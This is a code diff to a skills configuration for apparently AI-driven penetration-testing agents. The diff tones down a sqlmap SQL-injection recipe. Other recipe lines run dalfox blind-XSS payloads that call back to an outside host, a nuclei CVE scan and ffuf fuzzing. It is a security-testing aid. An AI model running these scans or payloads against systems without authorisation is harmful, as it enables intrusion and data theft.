@@ -53,7 +53,7 @@ SKILLS: list[dict] = [
         "when_to_use": "Use when target is a web application (HTTP/HTTPS). Especially for: form inputs, URL parameters, HTTP headers, JSON/XML API bodies, file upload endpoints. Loaded automatically by penetration + vulnerability-triage agents.",
         "methodology": [
             "1. Map attack surface (use attack-surface-recon skill results)",
-            "2. For each input vector: test SQLi (sqlmap --batch --risk=3 --level=5)",
+            "2. For each input vector: test SQLi (sqlmap -p <param> --technique=BEU --smart --batch --level=1 --risk=1)",
             "3. Test XSS (dalfox + manual payload injection)",
             "4. Test RCE/LFI (template injection, file inclusion via ffuf wordlists)",
             "5. Test IDOR (replace IDs in URL/JSON + observe responses)",
@@ -62,7 +62,7 @@ SKILLS: list[dict] = [
             "8. For each finding: capture PoC, CVSS v3.1 vector, WSTG ID, MITRE ATT&CK technique",
         ],
         "tool_recipes": [
-            "sqlmap -u 'http://target/page?id=1' --batch --risk=3 --level=5 --dbs",
+            "sqlmap -u 'http://target/page?id=1' -p id --technique=BEU --smart --batch --level=1 --risk=1",
             "dalfox url 'http://target/page?q=test' --blind 'https://hacker.xss.ht'",
             "nuclei -u http://target -t cves/2024/ -severity high,critical",
             "ffuf -u 'http://target/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401",
